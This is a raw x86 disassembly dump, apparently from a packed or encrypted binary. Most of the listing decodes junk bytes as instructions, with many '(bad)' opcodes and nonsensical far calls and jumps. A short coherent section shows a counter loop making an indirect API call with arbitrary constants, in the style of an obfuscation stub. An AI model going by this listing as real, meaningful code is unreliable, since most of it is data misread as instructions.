  404807:	mov    ecx,0xdb97cf2f
  40480c:	out    dx,al
  40480d:	imul   ebp,DWORD PTR [ebx],0xe50b1df0
  404813:	out    dx,eax
  404814:	mov    esi,0x513f707a
  404819:	mov    edi,0xe105649d
  40481e:	sub    BYTE PTR [eax+0x5b],0xd2
  404822:	jbe    0x4047f9
  404824:	jo     0x404876
  404826:	jecxz  0x4047ea
  404828:	fwait
  404829:	call   0x1929136b
  40482e:	mov    esp,0x89d964ee
  404833:	cmp    BYTE PTR [ebx-0x48],al
  404836:	fcomp  QWORD PTR [ecx]
  404838:	fnstsw WORD PTR [esi+esi*4]
  40483b:	ret    
  40483c:	xchg   BYTE PTR [eax+0x4ac3fc93],ch
  404842:	into   
  404843:	xchg   edx,eax
  404844:	push   0x3
  404846:	ffreep st(1)
  404848:	aas    
  404849:	ja     0x404815
  40484b:	fucom  st(0)
  40484d:	sbb    bl,dl
  40484f:	arpl   WORD PTR [ebx],di
  404851:	inc    edi
  404852:	(bad)  
  404854:	sub    DWORD PTR [ecx+0x667c6663],ecx
  40485a:	or     dh,BYTE PTR [edi-0x7d]
  40485d:	inc    esi
  40485e:	mov    bl,0x56
  404860:	pusha  
  404861:	rol    BYTE PTR [esi-0x10],1
  404864:	push   edx
  404865:	inc    DWORD PTR [ebp-0x5c]
  404868:	lods   eax,DWORD PTR gs:[esi]
  40486a:	test   eax,0xadaed8f6
  40486f:	cmp    ecx,DWORD PTR [esi-0x2]
  404872:	xor    al,0xe6
  404874:	pop    ebx
  404875:	ffree  st(0)
  404877:	retf   0x73c0
  40487a:	adc    BYTE PTR [eax-0x2f],ah
  40487d:	jecxz  0x40485f
  40487f:	dec    edx
  404880:	add    eax,0xa8b999df
  404885:	test   BYTE PTR [esi],cl
  404887:	test   eax,0xd21f6b44
  40488c:	push   0x106e2fa4
  404891:	jb     0x4048ba
  404893:	fs push ss
  404895:	xchg   DWORD PTR [edi],esp
  404897:	mov    eax,ds:0xcbf662a5
  40489c:	cmp    ch,BYTE PTR [edx+edx*2-0x57]
  4048a0:	push   DWORD PTR [esi]
  4048a2:	rcl    DWORD PTR [eax-0x5],0xa4
  4048a6:	js     0x40484e
  4048a8:	lahf   
  4048a9:	(bad)  
  4048aa:	call   0x866:0x8f83bddb
  4048b1:	ret    0x7b97
  4048b4:	fisttp WORD PTR [ecx]
  4048b6:	out    dx,al
  4048b7:	or     al,BYTE PTR [eax-0x53f26898]
  4048bd:	cdq    
  4048be:	push   ecx
  4048bf:	cwde   
  4048c0:	(bad)  
  4048c1:	mov    ds:0xdc21a069,al
  4048c6:	retf   
  4048c7:	in     eax,0x50
  4048c9:	je     0x4048f8
  4048cb:	push   esi
  4048cc:	xor    ch,dl
  4048ce:	jo     0x4048ba
  4048d0:	ss (bad) 
  4048d2:	(bad)  
  4048d3:	sub    DWORD PTR [esp+ebp*4+0x18],eax
  4048d7:	or     al,0x9
  4048d9:	jae    0x4048a9
  4048db:	cld    
  4048dc:	add    bl,ch
  4048de:	into   
  4048df:	pop    ecx
  4048e0:	jp     0x404949
  4048e2:	and    DWORD PTR [ebx],esi
  4048e4:	dec    esp
  4048e5:	mov    ebp,DWORD PTR [ebx+0x55b0fd7b]
  4048eb:	lods   al,BYTE PTR ds:[esi]
  4048ec:	push   ebx
  4048ed:	bound  eax,QWORD PTR [edi]
  4048ef:	jns    0x4048a9
  4048f1:	ret    
  4048f2:	jmp    0x404903
  4048f4:	add    al,0xe1
  4048f6:	dec    edi
  4048f7:	(bad)  
  4048f8:	loope  0x404908
  4048fa:	xor    BYTE PTR [edi+0x2f],bl
  4048fd:	sar    DWORD PTR [ecx+ecx*2],cl
  404900:	cmc    
  404901:	gs inc esp
  404903:	aaa    
  404904:	xor    ebp,DWORD PTR fs:[ebp-0x32c1a74f]
  40490b:	dec    esi
  40490c:	ja     0x4048c8
  40490e:	in     eax,dx
  40490f:	sub    DWORD PTR [ebp-0x3672c75d],esi
  404915:	call   0x2dac:0x8cdfc93f
  40491c:	mov    esi,0xdff0a9c8
  404921:	call   0xf4d5:0xdf351357
  404928:	add    BYTE PTR [ecx-0x239de85d],bh
  40492e:	pusha  
  40492f:	mov    ss,WORD PTR [eax]
  404931:	jnp    0x404952
  404933:	xchg   BYTE PTR [ebx+0x69df7c01],dl
  404939:	adc    al,0xf3
  40493b:	ffree  st(0)
  40493d:	push   es
  40493e:	pop    edi
  40493f:	mov    cl,0x5e
  404941:	mov    eax,0x3b26942f
  404946:	mov    ecx,0x38cb5dc7
  40494b:	pop    es
  40494c:	test   dh,0x41
  40494f:	or     al,0x78
  404952:	test   al,0x10
  404954:	imul   edi,DWORD PTR [eax-0x40],0x6
  404958:	push   ebp
  404959:	aaa    
  40495a:	or     DWORD PTR [edx-0x72],ebx
  40495d:	push   0x534383c
  404962:	retf   
  404963:	jb     0x4049d2
  404965:	lock fisub WORD PTR ds:0xb270c082
  40496c:	mov    ah,0x59
  40496e:	ins    BYTE PTR es:[edi],dx
  40496f:	push   ebp
  404970:	jne    0x40499f
  404972:	icebp  
  404973:	jp     0x40495d
  404975:	loop   0x404917
  404977:	sahf   
  404978:	adc    eax,0x69018062
  40497d:	jl     0x404937
  40497f:	dec    ecx
  404980:	inc    eax
  404981:	mov    bl,ch
  404983:	add    al,0xb3
  404985:	scas   al,BYTE PTR es:[edi]
  404986:	(bad)  
  404987:	sub    al,0xb9
  404989:	inc    BYTE PTR [esp+edi*8-0x24]
  40498d:	mov    al,0xb0
  40498f:	jo     0x404928
  404991:	jmp    0x40492a
  404993:	data16 stc 
  404995:	test   eax,0x9324e3f3
  40499a:	shl    edx,cl
  40499c:	inc    ebp
  40499d:	pop    esp
  40499e:	inc    ebp
  40499f:	adc    eax,0xd67aa109
  4049a4:	je     0x404956
  4049a6:	loopne 0x404994
  4049a8:	cmc    
  4049a9:	or     ebp,DWORD PTR [ebp-0x21]
  4049ac:	pop    ebx
  4049ad:	in     eax,dx
  4049ae:	call   0xa34b:0xd98378e1
  4049b5:	sub    ebx,0x8d8b2c44
  4049bb:	ds fdiv st,st(0)
  4049be:	aas    
  4049bf:	inc    esi
  4049c0:	js     0x40497a
  4049c2:	mov    ds:0xfc4370af,al
  4049c7:	xchg   esp,eax
  4049c8:	jns    0x4049e6
  4049ca:	repnz icebp 
  4049cc:	ret    
  4049cd:	out    0x53,al
  4049cf:	cmp    BYTE PTR [ebx-0x11],al
  4049d2:	or     BYTE PTR [edi+0x456d2551],ah
  4049d8:	push   0xffffffb0
  4049da:	scas   eax,DWORD PTR es:[edi]
  4049db:	inc    esi
  4049dc:	ins    BYTE PTR es:[edi],dx
  4049dd:	std    
  4049de:	add    dl,0x27
  4049e1:	xor    ecx,DWORD PTR [edi]
  4049e3:	in     al,0x40
  4049e5:	push   ebx
  4049e6:	ret    0x82c3
  4049e9:	xchg   ebx,eax
  4049ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049eb:	adc    esp,DWORD PTR [esi+ecx*1]
  4049ee:	push   ds
  4049ef:	fsub   st(7),st
  4049f1:	and    edi,edi
  4049f3:	popf   
  4049f4:	je     0x4049c1
  4049f6:	ins    BYTE PTR es:[edi],dx
  4049f7:	mov    ds:0x762ae3df,al
  4049fc:	js     0x404a33
  4049fe:	cmp    BYTE PTR [ecx+0x3cbd0190],ah
  404a04:	out    dx,al
  404a05:	cmp    al,0xf9
  404a07:	mov    bh,0xa7
  404a09:	cmc    
  404a0a:	jle    0x4049d9
  404a0c:	aad    0xf0
  404a0e:	adc    DWORD PTR [eax],edx
  404a10:	sub    DWORD PTR [edi+0x3566f9ae],esp
  404a16:	sbb    BYTE PTR [edi-0x13777273],bh
  404a1c:	jbe    0x4049ee
  404a1e:	cdq    
  404a1f:	test   al,0xae
  404a21:	shl    BYTE PTR [ecx],cl
  404a23:	mov    al,0xd8
  404a25:	cmp    al,0xa7
  404a27:	fnstenv [esi]
  404a29:	es pop ecx
  404a2b:	outs   dx,DWORD PTR ds:[esi]
  404a2c:	aas    
  404a2d:	mov    esp,0x23580bc9
  404a32:	inc    esi
  404a33:	mov    ch,0x12
  404a35:	push   ss
  404a36:	je     0x404a1a
  404a38:	push   esp
  404a39:	sbb    eax,0x5e8248b5
  404a3e:	add    eax,0x32695a21
  404a43:	dec    edx
  404a44:	in     eax,0x32
  404a46:	xor    DWORD PTR [ecx+0x7c],esi
  404a49:	add    BYTE PTR [esi+0x50b9a73d],ch
  404a4f:	or     BYTE PTR [ecx+0x7],dl
  404a52:	and    DWORD PTR ds:0x42a839,0x0
  404a5c:	mov    esi,DWORD PTR ds:0x42a839
  404a62:	inc    esi
  404a63:	mov    DWORD PTR ds:0x42a839,esi
  404a69:	cmp    DWORD PTR ds:0x42a839,0xd
  404a70:	jne    0x404a9d
  404a76:	push   DWORD PTR [ebp-0x28]
  404a79:	push   0x69d2
  404a7e:	push   0x518b
  404a83:	push   0x83d6
  404a88:	push   0x4eb7
  404a8d:	push   0x680f
  404a92:	push   0x7bad
  404a97:	call   DWORD PTR ds:0x41d188
  404a9d:	cmp    DWORD PTR ds:0x42a839,0xc
  404aa4:	jne    0x404ab7
  404aaa:	mov    esi,DWORD PTR ds:0x42a839
  404ab0:	inc    esi
  404ab1:	mov    DWORD PTR ds:0x42a839,esi
  404ab7:	cmp    DWORD PTR ds:0x42a839,0x16
  404abe:	jb     0x404a5c
  404ac4:	xor    edx,ecx
  404ac6:	sub    esi,DWORD PTR ds:0x42a7fd
  404acc:	mov    esi,0x327298
  404ad1:	jmp    0x404dc1
  404ad6:	enter  0xc53c,0xd1
  404ada:	(bad)  
  404adc:	aam    0xc1
  404ade:	mov    ah,0xf9
  404ae0:	int3   
  404ae1:	push   edx
  404ae2:	dec    esp
  404ae3:	gs xchg ecx,eax
  404ae5:	xchg   esi,eax
  404ae6:	inc    esi
  404ae7:	cs js  0x404b62
  404aea:	dec    ebp
  404aeb:	jle    0x404b65
  404aed:	js     0x404ab6
  404aef:	cmp    al,0xd5
  404af1:	push   eax
  404af2:	push   edi
  404af3:	mov    WORD PTR [edx+0x21],ds
  404af6:	cmp    al,0xed
  404af8:	mov    ebx,0x9cc0c7c3
  404afd:	inc    ecx
  404afe:	bound  eax,QWORD PTR [edi]
  404b00:	push   eax
  404b01:	popf   
  404b02:	xchg   esp,eax
  404b03:	inc    ecx
  404b04:	test   al,0x8
  404b06:	ins    BYTE PTR es:[edi],dx
  404b07:	bound  edx,QWORD PTR [ecx+0x8]
  404b0a:	push   es
  404b0b:	xlat   BYTE PTR ds:[ebx]
  404b0c:	ja     0x404b2f
  404b0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b0f:	adc    al,0xb8
  404b11:	addr16 mov dh,0xc1
  404b14:	push   eax
  404b15:	dec    esi
  404b16:	dec    edx
  404b17:	ins    DWORD PTR es:[edi],dx
  404b18:	shl    cl,cl
  404b1a:	push   ebp
  404b1b:	cmc    
  404b1c:	push   ss
  404b1d:	mov    ch,0x3e
  404b1f:	ja     0x404ad9
  404b21:	mov    ds:0xf505dba0,eax
  404b26:	pop    ss
  404b27:	call   0xa7c4161f
  404b2c:	mov    ch,0xd5
  404b2e:	mov    eax,0xc73b77d0
  404b33:	cdq    
  404b34:	push   ss
  404b35:	jbe    0x404b0b
  404b37:	nop
  404b38:	mov    ss,WORD PTR [ebx]
  404b3a:	gs sbb eax,0x1cfc7c0c
  404b40:	adc    edx,DWORD PTR [ecx+0x14]
  404b43:	sbb    esp,DWORD PTR [ecx-0xdca7d66]
  404b49:	js     0x404b1e
  404b4b:	dec    esi
  404b4c:	sub    DWORD PTR [ebx-0x17fb1db5],esi
  404b52:	jecxz  0x404b53
  404b54:	int3   
  404b55:	push   esi
  404b56:	retf   
  404b57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b58:	out    dx,eax
  404b59:	sub    DWORD PTR [bp+si+0x11],esi
  404b5d:	sub    DWORD PTR [esi-0x7e],ebx
  404b60:	jg     0x404b32
  404b62:	xchg   BYTE PTR [ebp+0x5f],al
  404b65:	hlt    
  404b66:	int3   
  404b67:	or     eax,0xe1567554
  404b6c:	dec    ebx
  404b6d:	fcom   DWORD PTR [edi-0x72bfc5a1]
  404b73:	add    ecx,DWORD PTR [ebx+0x58]
  404b76:	leave  
  404b77:	(bad)  
  404b78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b79:	add    DWORD PTR [eax-0xa660c48],esp
  404b7f:	into   
  404b80:	icebp  
  404b81:	xchg   ecx,eax
  404b82:	int3   
  404b83:	mov    bh,0x84
  404b85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b86:	xchg   edx,eax
  404b87:	inc    ebx
  404b88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b8a:	dec    ebx
  404b8b:	pop    eax
  404b8c:	mov    dl,0x82
  404b8e:	mov    ss,WORD PTR es:[ebx]
  404b91:	xor    eax,0x1b13359e
  404b96:	inc    esi
  404b97:	cmp    BYTE PTR [ecx],dh
  404b99:	xor    DWORD PTR [ebx],0xffffffbd
  404b9c:	cdq    
  404b9d:	daa    
  404b9e:	jecxz  0x404c0e
  404ba0:	sbb    al,cl
  404ba2:	test   eax,0x965ab75d
  404ba7:	xor    al,0x54
  404ba9:	bound  ebp,QWORD PTR [eax+0x64402a97]
  404baf:	mov    ds:0xca9a1e71,eax
  404bb4:	imul   ebp,DWORD PTR [esi],0xe3606c05
  404bba:	addr16 sub al,0x45
  404bbd:	push   edx
  404bbe:	mov    ah,0x72
  404bc0:	sti    
  404bc1:	test   eax,0xba36f78e
  404bc6:	repnz push 0x52ba0ead
  404bcc:	mov    cl,0x6b
  404bce:	sbb    cl,ch
  404bd0:	inc    eax
  404bd1:	sbb    eax,0xfba4da72
  404bd6:	clc    
  404bd7:	call   FWORD PTR [edx]
  404bd9:	sub    al,0xc6
  404bdb:	sbb    al,0xe4
  404bdd:	fild   DWORD PTR [ecx]
  404bdf:	adc    ecx,edx
  404be1:	add    BYTE PTR [ecx+0x2d82ebd7],ch
  404be7:	stos   BYTE PTR es:[edi],al
  404be8:	add    eax,0x8959157b
  404bed:	xor    DWORD PTR [eax-0x429c75f7],ebp
  404bf3:	xor    bl,BYTE PTR [ebp-0x5d]
  404bf6:	mov    bl,0x7e
  404bf8:	inc    ebp
  404bf9:	out    0x58,eax
  404bfb:	xor    BYTE PTR [edx-0x59d54846],0xec
  404c02:	push   esi
  404c03:	xor    ch,BYTE PTR [ecx-0x76]
  404c06:	sbb    esp,esi
  404c08:	out    0x5,eax
  404c0a:	or     eax,0xeb2f626c
  404c0f:	mov    ah,0xec
  404c11:	pop    esi
  404c12:	mov    esi,0x14495094
  404c17:	pop    ecx
  404c18:	pop    edi
  404c19:	ins    DWORD PTR es:[edi],dx
  404c1a:	pusha  
  404c1b:	sbb    eax,0x51b68d79
  404c20:	mov    dh,0x19
  404c22:	cwde   
  404c23:	inc    edx
  404c24:	xor    al,0x52
  404c26:	dec    edi
  404c27:	add    DWORD PTR [ebx+0x31],esp
  404c2a:	mul    DWORD PTR [edi+ebx*2-0x8]
  404c2e:	sub    DWORD PTR [esi+ebp*4+0x59],0x385e048b
  404c36:	stc    
  404c37:	addr16 jo 0x404c46
  404c3a:	div    bh
  404c3c:	inc    edi
  404c3d:	sub    edi,eax
  404c3f:	addr16 popf 
  404c41:	push   ds
  404c42:	ret    
  404c43:	test   DWORD PTR es:[ecx+0x9318c65],edi
  404c4a:	xlat   BYTE PTR ds:[ebx]
  404c4b:	call   0xb809fc1c
  404c50:	inc    edx
  404c51:	mov    ecx,DWORD PTR [ecx]
  404c53:	fdiv   st,st(5)
  404c55:	jmp    0x7ed6f096
  404c5a:	repz mov dh,cl
  404c5d:	dec    eax
  404c5e:	mov    BYTE PTR [esi-0x512ede0f],al
  404c64:	call   0xaf27:0xc5e2222d
  404c6b:	jae    0x404c43
  404c6d:	(bad)  
  404c6e:	xor    eax,0xe61b65b6
  404c73:	aad    0xbd
  404c75:	test   al,0xf1
  404c77:	jmp    0x5c5d:0xf13ffd84
  404c7e:	xchg   ebp,eax
  404c7f:	mov    ah,0x14
  404c81:	or     ecx,edi
  404c83:	cmp    eax,0x9413f3c6
  404c88:	or     BYTE PTR [edi-0x3c8281ce],dl
  404c8e:	fbstp  TBYTE PTR [ebx]
  404c90:	pusha  
  404c91:	pop    esi
  404c92:	ja     0x404c1e
  404c94:	cwde   
  404c95:	mov    ch,0x2c
  404c97:	pop    esi
  404c98:	jl     0x404c93
  404c9a:	lods   eax,DWORD PTR ds:[esi]
  404c9b:	xchg   esp,eax
  404c9c:	pop    esi
  404c9d:	(bad)  
  404c9e:	out    dx,eax
  404c9f:	mov    ebx,0x9d0175b7
  404ca4:	inc    eax
  404ca5:	or     al,0x7b
  404ca7:	add    BYTE PTR gs:[eax+0x51],cl
  404cab:	mov    dh,0x29
  404cad:	push   ds
  404cae:	push   0x18
  404cb0:	cwde   
  404cb1:	pop    edi
  404cb2:	pop    ecx
  404cb3:	mov    eax,ds:0x4081b5f4
  404cb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cb9:	cld    
  404cba:	mov    cl,0x88
  404cbc:	inc    esi
  404cbd:	mov    ebp,ss
  404cbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cc0:	jae    0x404cb7
  404cc2:	pop    esp
  404cc3:	repz cli 
  404cc5:	rcl    DWORD PTR [edx+0x1b],0x79
  404cc9:	cdq    
  404cca:	fsub   DWORD PTR [ebx]
  404ccc:	lds    ecx,FWORD PTR [ebx-0x59]
  404ccf:	neg    DWORD PTR [edi-0x5e2eaa8e]
  404cd5:	repz mov ebx,esi
  404cd8:	repnz push esi
  404cda:	stos   BYTE PTR es:[edi],al
  404cdb:	inc    esp
  404cdc:	cwde   
  404cdd:	xor    BYTE PTR [eax-0xd],ch
  404ce0:	mov    ebp,0x115594b5
  404ce5:	fistp  QWORD PTR [edx+0x1a]
  404ce8:	pop    ebp
  404ce9:	push   edi
  404cea:	mov    ch,BYTE PTR [ebx]
  404cec:	inc    ebp
  404ced:	mov    ebp,DWORD PTR [edi]
  404cef:	push   ecx
  404cf0:	setnp  BYTE PTR [ecx-0xd]
  404cf4:	ss pop ecx
  404cf6:	lods   al,BYTE PTR ds:[esi]
  404cf7:	mov    cl,0x8d
  404cf9:	lods   ax,WORD PTR ds:[esi]
  404cfb:	mov    bh,0x67
  404cfd:	fcomip st,st(7)
  404cff:	loop   0x404ccd
  404d01:	xlat   BYTE PTR ds:[ebx]
  404d02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d03:	pop    ecx
  404d04:	mov    ecx,0xd3dd947a
  404d09:	test   BYTE PTR [ebp-0x45],bh
  404d0c:	mov    dh,bh
  404d0e:	inc    ecx
  404d0f:	retf   0xa934
  404d12:	sbb    DWORD PTR [edi+0x5ffc757f],0x4ecfbd60
  404d1c:	ret    0x66da
  404d1f:	das    
  404d20:	mov    ah,0xae
  404d22:	pop    esp
  404d23:	mov    ds:0x3069c4c7,al
  404d28:	ret    
  404d29:	cdq    
  404d2a:	mov    DWORD PTR [ebx+eax*4],0x8f4db170
  404d31:	pop    ebx
  404d32:	mov    bh,0xb
  404d34:	xchg   esp,eax
  404d35:	mov    eax,edx
  404d37:	push   cs
  404d38:	mov    al,cl
  404d3a:	ret    0x3fbd
  404d3d:	jb     0x404d4f
  404d3f:	leave  
  404d40:	mov    eax,0x27e9877
  404d45:	dec    BYTE PTR [ecx+esi*8-0x4257a8]
  404d4c:	mov    ebp,0x43b954e0
  404d51:	push   eax
  404d52:	inc    edx
  404d53:	fadd   st(1),st
  404d55:	cmp    eax,0x50dfc91b
  404d5a:	pushf  
  404d5b:	cs stos DWORD PTR es:[edi],eax
  404d5d:	jge    0x404dd0
  404d5f:	imul   eax,DWORD PTR [edx+0x19],0xffffff82
  404d63:	mov    ebx,0x54a89e1b
  404d68:	xchg   ecx,eax
  404d69:	popa   
  404d6a:	mov    BYTE PTR [edi-0x7c],al
  404d6d:	inc    esp
  404d6e:	ins    DWORD PTR es:[edi],dx
  404d6f:	adc    al,0x47
  404d71:	es jae 0x404d85
  404d74:	mov    ds:0xd10100f7,eax
  404d79:	add    eax,0xb029d77a
  404d7e:	or     DWORD PTR [eax],edx
  404d80:	mov    ebx,0xc5e962cc
  404d85:	sub    DWORD PTR [edx],0x5faba525
  404d8b:	mov    edx,0x78e9f72f
  404d90:	mov    al,bl
  404d92:	fwait
  404d93:	in     al,0xf1
  404d95:	cld    
  404d96:	xchg   edi,eax
  404d97:	das    
  404d98:	sbb    DWORD PTR [edx],eax
  404d9a:	push   ebx
  404d9b:	mov    al,ds:0x866eb9be
  404da0:	mov    al,ds:0x6bae9c1c
  404da5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404da6:	je     0x404d48
  404da8:	or     DWORD PTR [eax],edx
  404daa:	pop    esp
  404dab:	push   ecx
  404dac:	pusha  
  404dad:	xchg   ebx,eax
  404dae:	xor    al,0xa5
  404db0:	and    BYTE PTR [esi-0x52],bl
  404db3:	xchg   ebx,eax
  404db4:	in     eax,dx
  404db5:	sti    
  404db6:	(bad)  
  404db7:	nop
  404db8:	mov    al,0x16
  404dba:	bound  esp,QWORD PTR [edi+esi*2-0xf]
  404dbe:	xor    BYTE PTR [edi],dl
  404dc0:	pop    ebx
  404dc1:	push   edi
  404dc2:	mov    edi,DWORD PTR [ebp+0x10]
  404dc5:	add    edx,esi
  404dc7:	cmp    edi,edx
  404dc9:	je     0x405a02
  404dcf:	mov    edx,DWORD PTR [ebp-0x8]
  404dd2:	mov    eax,DWORD PTR [ebp-0x4]
  404dd5:	xor    eax,ecx
  404dd7:	jmp    0x4050c7
  404ddc:	(bad)
  404ddf:	rcl    cl,0xd4
  404de2:	leave  
  404de3:	aad    0x26
  404de5:	xor    dh,BYTE PTR [esp+edx*2]
  404de8:	add    al,dh
  404dea:	jae    0x404e23
  404dec:	fwait
  404ded:	xor    edi,DWORD PTR [eax+0x78]
  404df0:	dec    ebp
  404df1:	jle    0x404e6b
  404df3:	js     0x404e56
  404df5:	mov    ecx,DWORD PTR [edx+0x2]
  404df8:	jo     0x404dc9
  404dfa:	cdq    
  404dfb:	mov    ebp,0xc491e231
  404e00:	hlt    
  404e01:	imul   esp,DWORD PTR [eax+edx*2],0xffffffeb
  404e05:	neg    dl
  404e07:	ficomp WORD PTR [edx+0x4f]
  404e0a:	adc    eax,0x92342d4e
  404e0f:	xchg   BYTE PTR [ebp-0x567d848c],dl
  404e15:	es mov edx,0xe890bfc
  404e1b:	test   al,0x71
  404e1d:	and    edx,DWORD PTR [ecx+ebp*1-0x4f7dc7b]
  404e24:	jecxz  0x404dee
  404e26:	dec    ecx
  404e27:	jno    0x404e41
  404e29:	pop    esp
  404e2a:	jmp    0x803b:0xedb76319
  404e31:	and    al,0x78
  404e33:	inc    edx
  404e34:	sub    DWORD PTR [edi],edx
  404e36:	mov    eax,ds:0xaa818efd
  404e3b:	push   ecx
  404e3c:	xor    eax,DWORD PTR [edi+0x83b0296]
  404e42:	pushf  
  404e43:	pop    edx
  404e44:	(bad)  
  404e45:	fimul  DWORD PTR [ecx-0x43179cde]
  404e4b:	sub    BYTE PTR [edx],cl
  404e4d:	fcom   DWORD PTR [esi+0x4b]
  404e50:	sub    dl,BYTE PTR [edx]
  404e52:	loop   0x404e45
  404e54:	sub    DWORD PTR [esi],0xffffffb4
  404e57:	sti    
  404e58:	push   ecx
  404e59:	sbb    DWORD PTR [edi],edx
  404e5b:	push   edi
  404e5c:	xchg   edi,eax
  404e5d:	sub    bl,BYTE PTR [edx+edx*4]
  404e60:	addr16 cmp al,0xb8
  404e63:	xchg   ebp,eax
  404e64:	xlat   BYTE PTR ss:[ebx]
  404e66:	jo     0x9fcdf993
  404e6c:	fs mov bl,0x94
  404e6f:	dec    esp
  404e70:	xchg   esi,eax
  404e71:	sub    ebp,DWORD PTR [ebx-0x55]
  404e74:	(bad)  
  404e75:	in     eax,dx
  404e76:	inc    ecx
  404e77:	ffreep st(2)
  404e79:	jmp    0xba29:0x24ef1e2
  404e80:	retf   0x1faa
  404e83:	daa    
  404e84:	pop    ebx
  404e85:	sahf   
  404e86:	mov    BYTE PTR ds:0xd6725f99,bl
  404e8c:	adc    dl,ch
  404e8e:	push   0x5eec658d
  404e93:	or     BYTE PTR [ebp+ecx*1+0x1c41be63],0xa9
  404e9b:	pop    ebp
  404e9c:	jb     0x404e9a
  404e9e:	ja     0x404e91
  404ea0:	shr    BYTE PTR [ecx+eax*1+0x7c9368a0],0x3f
  404ea8:	add    dl,cl
  404eaa:	jl     0x404e4f
  404eac:	jmp    0x404e3f
  404eae:	dec    edi
  404eaf:	add    BYTE PTR [ebx],bl
  404eb1:	lods   eax,DWORD PTR ds:[esi]
  404eb2:	add    eax,0xd3b51374
  404eb7:	out    0x1c,eax
  404eb9:	cmp    al,0x84
  404ebb:	xor    ebx,ecx
  404ebd:	(bad)  
  404ebe:	mov    ch,0x97
  404ec0:	jecxz  0x404ed3
  404ec2:	inc    eax
  404ec3:	mov    dh,0x3b
  404ec5:	sti    
  404ec6:	rol    DWORD PTR [edi+0x3669f6af],cl
  404ecc:	test   al,0xf4
  404ece:	xchg   edx,eax
  404ecf:	repnz dec esp
  404ed1:	or     eax,0x2f16a8fc
  404ed6:	adc    al,0x87
  404ed8:	mov    eax,ds:0x5c2cfb21
  404edd:	cmp    al,0x70
  404edf:	clc    
  404ee0:	ja     0x404e9f
  404ee2:	stos   BYTE PTR es:[edi],al
  404ee3:	add    BYTE PTR [edi+0x65],al
  404ee6:	test   ebx,ebp
  404ee8:	je     0x404f22
  404eea:	outs   dx,BYTE PTR ds:[esi]
  404eeb:	sub    DWORD PTR [edx],ebx
  404eed:	cmp    bh,BYTE PTR [edx]
  404eef:	stc    
  404ef0:	mov    WORD PTR [eax],ds
  404ef2:	std    
  404ef3:	push   edx
  404ef4:	adc    DWORD PTR [ebp-0x64],0x56
  404ef8:	outs   dx,DWORD PTR ds:[esi]
  404ef9:	sub    eax,0x556f87ef
  404efe:	or     eax,0xbfbd42d3
  404f03:	jle    0x404f56
  404f05:	jg     0x404eea
  404f07:	outs   dx,BYTE PTR ds:[esi]
  404f08:	mov    esi,0xa8b5efe
  404f0d:	mov    BYTE PTR [ebx+0x64],ah
  404f10:	icebp  
  404f11:	cmp    DWORD PTR ds:0xf802f45b,ecx
  404f17:	mov    ebx,0x460ff801
  404f1c:	or     ebx,DWORD PTR [eax+0x719b7979]
  404f22:	fwait
  404f23:	mov    esp,0xdfdd0dee
  404f28:	mov    bh,0xa3
  404f2a:	jno    0x404f2c
  404f2c:	xchg   ecx,eax
  404f2d:	outs   dx,BYTE PTR ds:[esi]
  404f2e:	cmp    ah,bl
  404f30:	dec    edi
  404f31:	stos   BYTE PTR es:[edi],al
  404f32:	cmp    esi,esp
  404f34:	(bad)  
  404f35:	mov    ds:0x5e15a321,eax
  404f3a:	xchg   esi,eax
  404f3b:	pushf  
  404f3c:	retf   0x74ac
  404f3f:	pop    ebx
  404f40:	lahf   
  404f41:	inc    ebp
  404f42:	in     eax,dx
  404f43:	sub    eax,0xdde4091d
  404f48:	popa   
  404f49:	push   ecx
  404f4a:	add    BYTE PTR [ebx],bh
  404f4c:	jmp    0xefd2de6d
  404f51:	add    cl,BYTE PTR [edi-0x2ba4ef2]
  404f57:	xchg   ecx,eax
  404f58:	shl    BYTE PTR [edx-0x74d62019],cl
  404f5e:	xchg   ebp,eax
  404f5f:	hlt    
  404f60:	popa   
  404f61:	pop    ecx
  404f62:	jno    0x404f7c
  404f64:	bound  ebp,QWORD PTR fs:[esi-0x4ae3bc31]
  404f6b:	pop    es
  404f6c:	inc    ecx
  404f6d:	jl     0x404f51
  404f6f:	addr16 lahf 
  404f71:	push   esp
  404f72:	cmp    DWORD PTR [esp+ecx*8-0x5d0a28f8],edx
  404f79:	inc    ebp
  404f7a:	cli    
  404f7b:	sar    BYTE PTR [edi-0x79e68b04],1
  404f81:	in     al,dx
  404f82:	ret    
  404f83:	in     al,0x50
  404f85:	in     al,0x25
  404f87:	repz aam 0xaa
  404f8a:	inc    esp
  404f8b:	gs sti 
  404f8d:	add    BYTE PTR [edx+0x42ebeb81],0x66
  404f94:	xchg   BYTE PTR [edi],bl
  404f96:	and    al,dh
  404f98:	sahf   
  404f99:	ds pop es
  404f9b:	ret    0x93
  404f9e:	stos   BYTE PTR es:[edi],al
  404f9f:	scas   al,BYTE PTR es:[edi]
  404fa0:	test   eax,0x88d68575
  404fa5:	jae    0x404f83
  404fa7:	jmp    DWORD PTR [edx]
  404fa9:	adc    BYTE PTR [eax],bh
  404fab:	repz jns 0x404ff7
  404fae:	adc    esi,0x69
  404fb1:	int3   
  404fb2:	inc    eax
  404fb3:	lea    esp,[edi]
  404fb5:	push   esi
  404fb6:	push   ss
  404fb7:	addr16 mov ah,0x69
  404fba:	or     al,0x6c
  404fbc:	imul   ecx,DWORD PTR [ecx-0x607da5cf],0x5988ab23
  404fc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fc7:	jbe    0x405013
  404fc9:	mov    eax,0x8cb67622
  404fce:	int3   
  404fcf:	mov    edx,0xa92fdc9c
  404fd4:	rcl    DWORD PTR [edx],cl
  404fd6:	aaa    
  404fd7:	stc    
  404fd8:	test   DWORD PTR [eax-0x53b9cd8f],edi
  404fde:	pop    ds
  404fdf:	push   ebp
  404fe0:	ret    0xff68
  404fe3:	rcr    DWORD PTR [eax+edi*8],0xe3
  404fe7:	inc    ebp
  404fe8:	push   ecx
  404fe9:	push   ebp
